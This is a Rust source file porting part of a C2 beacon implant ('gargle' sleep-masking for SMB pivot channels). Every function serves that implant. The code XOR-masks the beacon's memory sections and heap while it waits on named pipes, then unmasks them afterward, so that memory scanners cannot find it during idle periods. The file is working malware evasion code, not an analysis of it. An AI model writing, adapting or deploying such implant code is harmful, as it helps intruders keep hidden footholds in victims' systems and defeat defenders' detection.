//! Port of gargle_pivot_smb.cpp — sleep-masking around named-pipe waits for
//! SMB pivot channels.
//!
//! `GargleBlockPipe` blocks (with the beacon masked) until a client has
//! written data to the pipe; `GarglePipeWait` blocks (masked) until a client
//! connects to the pipe. Both only mask when `SETTING_GARGLE_NOOK` is set and
//! no worker threads are running; otherwise they degrade to the plain wait /
//! "not connected" behaviour, exactly like the C++.
//!
//! The C++ executed a copied asm trampoline while masked; the Rust port
//! applies the same XOR mask to the same memory ranges and blocks in a
//! `PeekNamedPipe`/`ConnectNamedPipe` loop with 100 ms sleeps (see
//! `crate::gargleint::mask_sections_and_heap`).

use crate::beacon::SETTING_GARGLE_NOOK;
use crate::gargleint::{gargle_trampoline, GargleP};
use crate::settings::setting_int;
use crate::state::THREAD_COUNT;
use std::ffi::c_void;
use std::sync::atomic::Ordering;
use std::time::Duration;
use windows_sys::Win32::Foundation::{GetLastError, HANDLE, ERROR_BROKEN_PIPE, ERROR_PIPE_CONNECTED};
use windows_sys::Win32::Storage::FileSystem::ReadFile;
use windows_sys::Win32::System::IO::OVERLAPPED;
use windows_sys::Win32::System::Pipes::{ConnectNamedPipe, PeekNamedPipe};
use windows_sys::Win32::System::Threading::Sleep;

/// `GARGLE_ACTION_PIPE_WAIT` — wait for a client to connect.
pub const GARGLE_ACTION_PIPE_WAIT: i32 = 0;
/// `GARGLE_ACTION_PIPE_PEEK` — wait until data is available.
pub const GARGLE_ACTION_PIPE_PEEK: i32 = 1;

type ConnectNamedPipeProc = unsafe extern "system" fn(HANDLE, *mut OVERLAPPED) -> i32;
type GetLastErrorProc = unsafe extern "system" fn() -> u32;
type PeekNamedPipeProc = unsafe extern "system" fn(
    HANDLE,
    *mut c_void,
    u32,
    *mut u32,
    *mut u32,
    *mut u32,
) -> i32;
type SleepProc = unsafe extern "system" fn(u32);

/// `GARGLE_PIPE_ARGS` — arguments passed to the pipe mask routine.
#[repr(C)]
pub struct GarglePipeArgs {
    /// What to do: [`GARGLE_ACTION_PIPE_WAIT`] or [`GARGLE_ACTION_PIPE_PEEK`].
    pub action: i32,
    /// The named pipe handle.
    pub pipe: HANDLE,
    pub connect_named_pipe: ConnectNamedPipeProc,
    pub get_last_error: GetLastErrorProc,
    pub peek_named_pipe: PeekNamedPipeProc,
    pub sleep: SleepProc,
}

/// `GARGLEF` for the pipe variant.
type GargleF = fn(&GargleP, &GarglePipeArgs);

/// `_gargle_it` — masked pipe wait.
///
/// Masks the beacon data, blocks until the requested pipe condition is met,
/// then unmasks. The function pointers in `args` mirror the C++ struct; the
/// wait itself calls the Win32 API directly (identical semantics).
fn gargle_it(parms: &GargleP, args: &GarglePipeArgs) {
    crate::gargleint::mask_sections_and_heap(parms);

    match args.action {
        GARGLE_ACTION_PIPE_WAIT => {
            /* wait for a client to connect to our pipe */
            loop {
                let connected = unsafe { ConnectNamedPipe(args.pipe, std::ptr::null_mut()) };
                if connected != 0 {
                    break;
                }
                let err = unsafe { GetLastError() };
                /* the client connected between CreateNamedPipe and our call */
                if err == ERROR_PIPE_CONNECTED {
                    break;
                }
                std::thread::sleep(Duration::from_millis(100));
            }
        }
        _ => {
            /* GARGLE_ACTION_PIPE_PEEK: wait until data is available */
            loop {
                let mut available: u32 = 0;
                let ok = unsafe {
                    PeekNamedPipe(
                        args.pipe,
                        std::ptr::null_mut(),
                        0,
                        std::ptr::null_mut(),
                        &mut available,
                        std::ptr::null_mut(),
                    )
                };
                if ok != 0 && available > 0 {
                    break;
                }
                if ok == 0 {
                    let err = unsafe { GetLastError() };
                    /* the client disconnected; nothing more will arrive */
                    if err == ERROR_BROKEN_PIPE {
                        break;
                    }
                }
                std::thread::sleep(Duration::from_millis(100));
            }
        }
    }

    crate::gargleint::unmask_sections_and_heap(parms);
}

/// `setup_trampoline2` — one-time trampoline/parameter setup.
fn setup_trampoline2() {
    gargle_trampoline(
        (setup_trampoline2 as fn()) as usize as *mut u8,
        (gargle_it as GargleF) as usize as *mut u8,
    );
}

/// `GargleBlockPipe` — block, with the beacon masked, until the pipe has data.
///
/// Does nothing when gargle is disabled or worker threads are running.
pub fn gargle_block_pipe(pipe: isize) {
    if setting_int(SETTING_GARGLE_NOOK) == 0 || THREAD_COUNT.load(Ordering::SeqCst) > 0 {
        /* do nothing */
        return;
    }

    /* create our trampoline, please */
    setup_trampoline2();

    /* setup our arguments */
    let args = GarglePipeArgs {
        action: GARGLE_ACTION_PIPE_PEEK,
        pipe: pipe as HANDLE,
        connect_named_pipe: ConnectNamedPipe,
        get_last_error: GetLastError,
        peek_named_pipe: PeekNamedPipe,
        sleep: Sleep,
    };

    /* get the heap sections to mask. */
    crate::gargleint::refresh_heap_records();

    /* call our function */
    let parms = crate::gargleint::gparms();
    gargle_it(&parms, &args);
}

/// `GarglePipeWait` — block, with the beacon masked, until a client connects
/// to the pipe. Returns `true` once connected (the C++ always returns `TRUE`
/// after the masked wait completes); returns `false` when gargle is disabled
/// or worker threads are running, mirroring the C++ `FALSE` fall-through.
pub fn gargle_pipe_wait(pipe: isize) -> bool {
    if setting_int(SETTING_GARGLE_NOOK) == 0 || THREAD_COUNT.load(Ordering::SeqCst) > 0 {
        return false;
    }

    /* create our trampoline, please */
    setup_trampoline2();

    /* setup our arguments */
    let args = GarglePipeArgs {
        action: GARGLE_ACTION_PIPE_WAIT,
        pipe: pipe as HANDLE,
        connect_named_pipe: ConnectNamedPipe,
        get_last_error: GetLastError,
        peek_named_pipe: PeekNamedPipe,
        sleep: Sleep,
    };

    /* get the heap sections to mask. */
    crate::gargleint::refresh_heap_records();

    /* call our function */
    let parms = crate::gargleint::gparms();
    gargle_it(&parms, &args);

    /* return the out value from our struct */
    true
}

/// Wait for a client to connect to the named pipe (unmasked helper used by the
/// non-gargle path of [`gargle_wait_smb`]).
fn wait_pipe_connected(pipe: HANDLE) -> bool {
    loop {
        let connected = unsafe { ConnectNamedPipe(pipe, std::ptr::null_mut()) };
        if connected != 0 {
            return true;
        }
        let err = unsafe { GetLastError() };
        if err == ERROR_PIPE_CONNECTED {
            return true;
        }
        std::thread::sleep(Duration::from_millis(100));
    }
}

/// Read up to `max` bytes from the pipe into `read`; returns the number of
/// bytes read, or -1 on failure.
fn read_pipe(pipe: HANDLE, read: *mut u8, max: usize) -> i32 {
    if read.is_null() || max == 0 {
        return 0;
    }
    let mut nread: u32 = 0;
    let ok = unsafe { ReadFile(pipe, read, max as u32, &mut nread, std::ptr::null_mut()) };
    if ok == 0 {
        return -1;
    }
    nread as i32
}

/// Masked variant of the SMB wait: block (masked) until a client connects,
/// then read up to `max` bytes into `read`. Returns the number of bytes read,
/// or -1 if the read failed. When gargle is disabled this degrades to the
/// plain wait + read with no masking.
pub fn gargle_wait_smb(handle: isize, read: *mut u8, max: usize) -> i32 {
    let pipe = handle as HANDLE;

    if setting_int(SETTING_GARGLE_NOOK) == 0 || THREAD_COUNT.load(Ordering::SeqCst) > 0 {
        wait_pipe_connected(pipe);
        return read_pipe(pipe, read, max);
    }

    setup_trampoline2();
    crate::gargleint::refresh_heap_records();

    let parms = crate::gargleint::gparms();
    crate::gargleint::mask_sections_and_heap(&parms);

    wait_pipe_connected(pipe);
    let nread = read_pipe(pipe, read, max);

    crate::gargleint::unmask_sections_and_heap(&parms);
    nread
}

/// Masked variant of the SMB accept: block (masked) until a client connects
/// to the pipe and return the connected pipe handle (named pipes reuse the
/// server handle, so the input handle is returned). When gargle is disabled
/// the handle is returned without waiting, mirroring the C++ `GarglePipeWait`
/// fall-through.
pub fn gargle_accept_smb(handle: isize) -> isize {
    if setting_int(SETTING_GARGLE_NOOK) == 0 || THREAD_COUNT.load(Ordering::SeqCst) > 0 {
        return handle;
    }

    setup_trampoline2();
    crate::gargleint::refresh_heap_records();

    let parms = crate::gargleint::gparms();
    crate::gargleint::mask_sections_and_heap(&parms);

    wait_pipe_connected(handle as HANDLE);

    crate::gargleint::unmask_sections_and_heap(&parms);
    handle
}
